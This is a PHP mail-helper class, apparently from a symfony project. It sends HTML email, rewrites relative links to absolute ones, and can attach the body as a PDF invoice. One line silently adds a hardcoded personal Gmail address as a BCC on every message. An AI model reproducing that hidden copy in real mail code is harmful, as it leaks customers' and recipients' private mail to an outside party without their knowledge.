<?php 
class Mail{
	
	public static function SendEmail($from, $to, $cc, $bcc, $subject, $body,$send_as_pdf_attachment = false){
	    $title = '';
	    $detail = '';
	    $mail = new sfMail();
	    $mail->setMailer('sendmail');
	    $mail->initialize();
	    $mail->setCharset('utf-8');
	    $mail->setContentType('text/html');
	    // definition of the required parameters
	    $from = explode(",", $from);
	    $from = $from[0];
	    $tos = array(); $ccs = array(); $bccs = array();
	    $tos = explode(",", $to);
	    $ccs = explode(",", $cc);
	    $bccs =explode(",", $bcc);
	
	    $mail->setSender($from);
	    $mail->setFrom($from);
	
	    foreach ($tos as $too)
	    $mail->addAddress($too);
	
	    foreach ($ccs as $too)
	    $mail->addCc($too);
	    foreach ($bccs as $too)
	    $mail->addBcc($too);
	
	    $mail->addBcc('mohammadsaf...@gmail.com');
	    $mail->setSubject($subject);
	    /*
	     if ($type == 'template'){
	     //$file =
	sfConfig::get('sf_app_module_dir').'/mail/templates/_template_'.$body.'.php';
	     //$body = file_get_contents($file);
	
	require_once(sfConfig::get('sf_symfony_lib_dir').'/helper/PartialHelper.php');
	     $body = get_partial('mail/template_'.$body);
	
	     }
	     */
	
	    $body = str_replace('url(/', 'url('.sfConfig::get('app_url').'/',$body);
	
	    $body = str_replace('<img src="/', '<img src="'.sfConfig::get('app_url').'/', $body);
	
	    $body = str_replace('src="/images/','src="'.sfConfig::get('app_url').'/images/', $body);
	    $body = str_replace('href="/', 'href="'.sfConfig::get('app_url').'/',$body);
	    $body = str_replace('<img ', '<img style="margin:5px" ', $body);
	
	    if ($send_as_pdf_attachment)
	    {
	      if ($pdf = self::getPDF($body))
	      $mail->addStringAttachment($pdf, 'gtc-invoice.pdf', 'base64',	'application/pdf');
	
	      $body = "Please View the Attached PDF File.";
	    };
	
	    $mail->setContentType('text/html');
	    $mail->setContentType('multipart/alternative');
	    $mail->setBody($body);
	    $mail->setAltBody(strip_tags($body));
	
	    //$mail->setBody($body);
	    $mail->send();
	    return;
	
	  } 
		
}

?> 